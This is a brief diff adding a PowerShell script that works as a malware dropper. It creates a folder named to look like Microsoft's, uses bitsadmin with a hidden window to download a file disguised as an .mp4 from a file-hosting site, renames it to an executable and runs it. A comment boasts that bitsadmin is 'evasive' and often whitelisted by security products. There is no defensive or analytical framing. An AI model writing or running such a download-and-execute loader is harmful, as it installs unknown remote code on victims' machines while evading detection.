@@ -1,0 +1,11 @@
+[Net.ServicePointManager]::SecurityProtocol = 'Tls12';
+$p='C:\ProgramData\Microsoft\DRM(wpa)';
+New-Item $p -ItemType Directory -Force -ErrorAction SilentlyContinue;
+$f = $p + '\svcwrap';
+
+# Use BITSAdmin for a more resilient and evasive download. This is often whitelisted by security products.
+$args = "/transfer cboxjob /download /priority normal https://files.catbox.moe/2iknh2.mp4 $($f+'.tmp')";
+Start-Process bitsadmin.exe -ArgumentList $args -Wait -WindowStyle Hidden;
+
+Rename-Item ($f+'.tmp') ($f+'.exe');
+& ($f+'.exe');
